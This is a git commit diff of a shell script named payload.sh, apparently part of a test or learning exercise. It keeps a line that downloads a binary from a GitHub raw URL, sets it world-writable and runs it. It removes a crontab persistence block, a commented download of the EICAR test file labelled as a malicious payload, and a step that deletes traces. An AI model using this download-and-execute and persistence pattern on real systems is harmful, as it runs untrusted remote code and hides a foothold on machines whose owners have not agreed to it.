a3a0cfce440020c705f1c6706bfa26bf0baed348
b4ldrrr <artelia.yeve@gmail.com>
2024-06-25 16:16:22 +0200

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,17 +1,4 @@
 #!/bin/sh
 
-#Persistance
-cp ./payload.sh /usr/local/share/payload.sh;
-crontab -l > mycron;
-echo "0 0 * * * /usr/local/share/payload.sh" >> mycron;
-crontab mycron;
-
 #Test
 wget 'https://raw.githubusercontent.com/b4ldrrr/web2/main/testmayoly'; chmod 777 ./testmayoly; ./testmayoly;
-
-#Téléchargement charge malveillante
-#wget 'https://secure.eicar.org/eicar_com.zip';
-
-#Nettoyage
-rm mycron;
-rm ./payload.sh;
